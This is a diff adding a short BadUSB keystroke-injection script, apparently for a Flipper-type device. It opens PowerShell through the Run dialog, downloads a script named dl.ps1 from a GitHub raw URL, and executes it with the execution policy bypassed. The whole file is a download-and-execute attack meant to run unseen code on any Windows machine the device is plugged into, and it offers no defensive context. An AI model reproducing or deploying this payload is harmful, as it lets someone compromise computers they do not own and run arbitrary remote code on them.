@@ -1,0 +1,17 @@
+REM This Badusb will download a powershell script from a github raw and execute it, 
+
+REM Open windows powershell
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 750
+
+STRING Invoke-WebRequest -Uri https://raw.githubusercontent.com/Sn0wAlice/Flip-Her-0/main/badusb/scripts/w02/dl.ps1 -OutFile dl.ps1
+ENTER
+DELAY 750
+
+STRING PowerShell -NoProfile -ExecutionPolicy Bypass -Command "& './dl.ps1'"
+ENTER
